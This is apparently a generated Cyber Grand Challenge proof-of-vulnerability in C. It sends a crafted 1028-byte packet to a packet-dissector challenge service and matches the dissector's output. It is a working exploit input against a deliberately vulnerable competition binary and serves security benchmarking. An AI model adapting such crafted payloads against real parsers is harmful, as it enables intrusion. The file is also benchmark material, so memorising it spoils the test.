#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xcb\x33\x6e\x1e"
         "\xd4\xd2\x5e\xc6\x5f\xe7\xd9\x02\xc1\xff\xbc\xc1\x3e\xa3\x3a\xeb"
         "\x0d\x01\x00\x00\x00\x24\xfb\x84\x35\x03\x12\x26\x44\xad\xa8\x1f"
         "\x7b\x3d\x5a\x81\x34\xbb\x63\x07\x40\xdf\x61\x9c\x42\x77\x4d\x33"
         "\x75\x97\x7f\x78\x5c\x28\xa2\x20\x16\xf9\x56\x12\x62\x55\x64\x78"
         "\xae\x64\x5c\x44\x64\x2c\x26\x61\xfa\xed\x21\x7f\xcb\x95\xaa\x96"
         "\x5b\x83\xf8\x75\x85\x1d\xf4\xad\x15\x78\xba\x7c\x57\x6d\x5a\x47"
         "\xd5\xb6\x0c\xa6\xef\x17\x40\xd1\x16\x9b\x92\xb0\x2d\xcc\x93\x2f"
         "\x62\xf7\xf4\x2e\xfe\xa5\xa6\x48\x7e\xce\x73\xaf\x12\x04\xcb\x52"
         "\x24\xc4\xf1\xf3\xc3\x95\xbd\x28\x45\xc7\xc8\x0d\xa4\x38\x00\xa2"
         "\x2d\x96\x6a\x35\xf9\x69\xd9\x48\xaa\xb3\x71\x4b\x27\x11\xa9\x83"
         "\x58\x9a\x65\x39\xf8\x40\x24\x66\x5e\xb8\x1b\xb2\xbc\xe4\xf8\xdb"
         "\x99\xc9\x56\xfa\xe5\x12\xef\x2b\x6a\x31\x15\x89\x68\x44\x5b\x55"
         "\x80\x13\x72\xa8\x89\xc8\x65\x1d\xde\x21\x27\xd0\x76\xea\xdc\x3c"
         "\x3e\xc9\xa0\x72\xb5\x1f\x70\x74\xdc\x10\x9f\x7d\x91\x72\x3b\x7f"
         "\xd0\x3a\x2f\x89\x3f\xda\xdf\xe1\x3a\x17\xbf\x0e\xfa\xa5\xac\xb2"
         "\x10\xf2\xd4\xdf\x81\x78\xb9\x94\x26\x80\xf6\x2d\x4e\x08\x57\xee"
         "\x26\x55\x5c\x69\x44\x3d\xd4\xda\xbd\x37\x13\x95\x23\xe3\x1d\xa8"
         "\x88\x26\xc5\x92\x02\x47\x5e\x05\xde\x79\xb0\xe3\xe9\x83\xce\xb9"
         "\x99\xe9\x32\x69\x9f\x0d\x38\xbc\x29\x83\xa5\x6a\xaa\x10\x4d\xa1"
         "\x71\xda\xc5\x71\x05\xdb\x9d\x44\x86\x71\x2c\xc3\xf9\x7e\xd8\x17"
         "\xa9\xeb\x0a\xba\x4c\xe5\xe8\x8f\x55\x49\xfd\xbb\x35\x53\x6a\xf6"
         "\x72\x44\xaa\x0e\x75\x95\x9a\x20\x4a\x12\x14\x50\xf9\x8a\xcf\x61"
         "\xb1\x57\x89\xb9\xc7\x09\xaa\x55\x38\x84\x95\x25\x6e\x5b\xbc\x6f"
         "\x13\x37\x6f\xf7\x84\xe4\x0d\xdd\x25\x37\xac\x4f\x29\x78\x8d\xae"
         "\x6f\x11\xbd\xda\xb9\x78\xaa\x42\xdc\x55\x18\x99\x2c\x17\x1f\xfe"
         "\x80\x08\x02\x6b\x4b\x7f\x5f\xe8\x49\xca\x5d\x2d\x5d\x9d\xd2\x5b"
         "\x8e\xc2\x89\x4e\x59\x7a\x4b\x39\x2e\x82\x02\xc2\x30\xd1\x95\xaa"
         "\xec\x13\xac\x72\x14\xe3\x82\x2d\x78\xa6\xfd\x99\x40\x7a\x7b\xfc"
         "\xcd\x01\xee\x88\x8e\x4c\x56\x7f\xb3\xc9\x66\xd5\xc8\x64\x3c\x4e"
         "\x74\xb0\x1f\xa4\x62\xfd\x72\x0e\x88\x01\x2f\x93\x48\x1e\xe1\x58"
         "\x2c\x12\x87\x87\x80\xac\xdb\x12\x9a\xc3\x62\xcd\x04\x16\xcf\xec"
         "\x7c\x7b\x45\x7f\xa9\xf8\x47\x90\xcc\xe5\x3c\xda\x34\xb3\xd5\x7b"
         "\x4e\x49\xf6\x23\x77\x3a\xc6\xc4\x3e\x96\xaf\xa7\x8f\xbf\x3c\xa2"
         "\x72\xa5\x19\x14\xb6\xc8\x87\x81\xe4\xcd\x23\xd7\xd4\xaf\x5b\xe4"
         "\x0f\xd8\x93\x9d\xcf\x31\xf9\x19\x5d\xe6\x38\xee\x1b\x6c\x3c\x20"
         "\x4c\x57\x01\x3b\x4d\x0d\x2e\x87\x22\x2f\x64\xa1\x98\x8a\x19\x82"
         "\x50\x57\x75\xc0\xc7\xb5\xdc\x29\x00\x8a\xb6\x1a\x61\xa3\x7e\x6d"
         "\x52\x7a\x62\xdb\xf7\x06\x42\x86\xc5\x61\xc7\x46\x3f\x17\x2b\x0a"
         "\x29\x8c\x43\x98\xcf\x3b\x5c\x62\x2a\x70\xe3\x58\xc3\x53\x1c\x9a"
         "\x30\xe5\x03\xcf\xe2\xc7\x44\xdf\x8e\x73\x11\xf1\x3b\xff\x92\x76"
         "\x8e\xeb\x41\xbd\x48\x16\x7c\x40\x2c\x8d\xee\x61\xb4\x76\x8d\xa5"
         "\xed\xcb\x4d\xd8\xe6\x99\x34\x0e\x28\x4c\x53\x55\x5c\xd0\xad\x30"
         "\xca\x83\xf0\xb6\xac\x74\x99\x37\x2b\x27\xda\xb8\x48\xea\xb3\x94"
         "\x9e\xc3\xf7\x27\x94\xaf\x51\x48\x26\x92\x58\x50\x5e\xde\xc6\x0d"
         "\x43\x0c\x8d\xbc\x62\xea\x38\x00\x2b\x00\x14\x56\x0f\x62\x30\x40"
         "\x7b\x62\x5c\x4d\x81\x93\x93\x6b\x9f\x4f\xf6\xa2\x67\xc9\xcf\xe9"
         "\x51\xfc\x5a\xe7\x53\xc2\x20\x93\x71\x87\xa9\x7f\xd1\xa6\xa2\x96"
         "\x6b\x87\xea\x62\x52\xe2\xbf\xa6\x68\x89\x0f\x90\xd2\xcb\x1c\xb8"
         "\x81\x5c\xd6\xcb\xe7\xae\x08\x1e\xaa\x06\x2a\xfc\xda\xea\x2f\xb1"
         "\xb3\x28\xd0\x63\xdc\x6a\xb4\x0e\x30\x2e\xb6\x0d\x97\xd7\xb9\xd6"
         "\x18\x92\x75\xb1\x35\xb8\x81\x35\xbc\xe7\xc0\x6c\x50\x3c\x1f\xc4"
         "\x64\xec\x2c\x3b\x2e\x50\xef\xc2\xc8\xaf\x6e\x7e\xb9\xbf\xd5\x13"
         "\xa7\x3e\x80\x77\x44\x60\x38\xe8\xef\xe8\x52\x9e\x78\xbc\x76\x02"
         "\x68\x3d\x6a\xc2\x7c\xb8\xb8\x26\x09\x8f\xb0\xe9\x0a\xbc\x56\xce"
         "\xca\x4f\x9b\x89\xf5\x62\x85\x47\xac\xcd\x2e\x58\xf0\x35\x08\xd0"
         "\xba\x6b\xef\xd6\x78\xb4\x4b\x92\x04\x62\x2e\xbb\xf2\x86\x13\x21"
         "\x35\x1d\x97\xcf\xd2\x80\x86\x0f\xb5\x1c\xf5\xcb\x9c\x1c\x23\x5d"
         "\xb3\x78\x37\xfd\xcb\x29\x13\xce\x9f\x81\xfb\x60\x1f\x17\xcf\x53"
         "\xdc\x6c\xae\xae\x37\x35\x63\xc3\x36\x90\xd9\xf1\xc7\xa5\x1b\x9f"
         "\x27\xf2\x4a\x35\xc6\xd0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===arecolidinehyalodacite
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x72\x65\x63\x6f\x6c\x69\x64\x69\x6e\x65"
         "\x68\x79\x61\x6c\x6f\x64\x61\x63\x69\x74\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
